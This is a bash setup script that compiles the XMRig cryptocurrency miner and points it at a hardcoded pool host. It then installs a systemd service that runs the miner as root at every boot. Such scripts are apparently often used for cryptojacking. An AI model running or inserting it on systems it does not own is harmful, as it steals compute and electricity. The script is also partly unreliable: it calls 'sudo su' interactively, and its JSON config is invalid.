#!/bin/bash
sudo su
sudo apt-get update &&
sudo apt-get install software-properties-common -y &&
sudo add-apt-repository ppa:jonathonf/gcc-7.1 -y &&
sudo apt-get update &&
sudo apt-get install gcc-7 g++-7 -y &&
sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev -y &&
sudo sysctl -w vm.nr_hugepages=128 && cd /usr/local/src/ &&
git clone https://github.com/xmrig/xmrig.git &&
cd xmrig &&
mkdir build &&
cd build &&
sudo cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 &&
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo ) &&
make -j $cpucores &&

sudo bash -c 'cat <<EOT >> /usr/local/src/xmrig/build/config.json
{
    "algo": "cryptonight",
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "version": 1,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 8, 2, 10, 4, 12, 6, 14, 1, 9, 3, 11, 5, 13, 7, 15],
        "cn": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6],
            [1, 1],
            [1, 3],
            [1, 5],
            [1, 7]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 2],
            [1, 1],
            [1, 3]
        ],
        "cn-lite": [
            [1, 0],
            [1, 8],
            [1, 2],
            [1, 10],
            [1, 4],
            [1, 12],
            [1, 6],
            [1, 14],
            [1, 1],
            [1, 9],
            [1, 3],
            [1, 11],
            [1, 5],
            [1, 13],
            [1, 7],
            [1, 15]
        ],
        "cn-pico": [
            [2, 0],
            [2, 8],
            [2, 2],
            [2, 10],
            [2, 4],
            [2, 12],
            [2, 6],
            [2, 14],
            [2, 1],
            [2, 9],
            [2, 3],
            [2, 11],
            [2, 5],
            [2, 13],
            [2, 7],
            [2, 15]
        ],
        "cn/gpu": [0, 8, 2, 10, 4, 12, 6, 14, 1, 9, 3, 11, 5, 13, 7, 15],
        "rx": [0, 2, 4, 6, 8, 10, 12, 14, 1, 3, 5, 7, 9, 11, 13],
        "rx/wow": [0, 8, 2, 10, 4, 12, 6, 14, 1, 9, 3, 11, 5, 13, 7, 15],
        "cn/0": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6],
            [1, 1],
            [1, 3],
            [1, 5],
            [1, 7]
        ],
        "cn-lite/0": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6],
            [1, 1],
            [1, 3],
            [1, 5],
            [1, 7]
        ]
    },
    "asm": true,
    "autosave": true,
    "av": 0,
    "background": false,
    "colors": true,
    "cpu-affinity": null,
    "cpu-priority": null,
    "donate-level": 1,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 80,
    "pools": [
        {
            "url": "khoi.haidangwin.cc:8080",
            "user": "nodeproxy",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "variant": -1,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null
        }
    ],
    "print-time": 60,
    "retries": 5,
	"retry-pause": 5,
    "safe": false,
    "threads": [
        {
            "low_power_mode": 1,
            "affine_to_cpu": 0,
            "asm": true
        },
    ],
    "user-agent": null,
    "syslog": false,
    "watch": false
}
EOT
' &&

sudo bash -c 'cat <<EOT >>/lib/systemd/system/xmrig.service
[Unit]
Description=xmrig
After=network.target
[Service]
ExecStart=/usr/local/src/xmrig/build/xmrig
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo systemctl daemon-reload && 
sudo systemctl enable xmrig.service && 
sudo systemctl start xmrig.service
